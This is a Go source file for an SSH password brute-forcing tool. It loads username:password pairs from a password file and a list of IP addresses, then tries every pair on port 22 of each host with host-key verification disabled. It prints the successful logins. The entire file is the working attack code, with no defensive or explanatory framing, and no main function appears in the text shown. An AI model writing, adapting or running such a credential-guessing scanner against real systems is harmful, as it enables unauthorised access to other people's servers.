package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

func read_passwords() [][]string {
	file, err := os.Open("passfile.txt")

	if err != nil {
		log.Fatal("no passfile")
	}

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var txtlines []string

	for scanner.Scan() {
		txtlines = append(txtlines, scanner.Text())
	}

	file.Close()

	var userpass [][]string

	for _, eachline := range txtlines {
		userpass = append(userpass, strings.Split(eachline, ":"))
	}

	return userpass
}

func read_ip_list() []string {
	file, err := os.Open("ipuri")

	if err != nil {
		log.Fatal("no ip list")
	}

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var txtlines []string

	for scanner.Scan() {
		txtlines = append(txtlines, scanner.Text())
	}

	file.Close()

	return txtlines

}

func RunCli(user *string, pass *string, ip string) {
	config := &ssh.ClientConfig{
		User:    *user,
		Timeout: time.Millisecond * 3000,
		Auth: []ssh.AuthMethod{
			ssh.Password(*pass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	conn, err := ssh.Dial("tcp", ip+":22", config)

	if err != nil {
		return
	}
	sess, err := conn.NewSession()

	if err != nil {
		fmt.Println("[Failed] "+ip+" -> "+*user+":"+*pass, err)
		return
	}

	sess.Close()

	fmt.Println("[Success] ", ip, ":", user, ":", pass)
}

func scan(data *[][]string, ip string) {

	for _, p := range *data {
		user := p[0]
		pass := p[1]
		RunCli(&user, &pass, ip)

	}

}
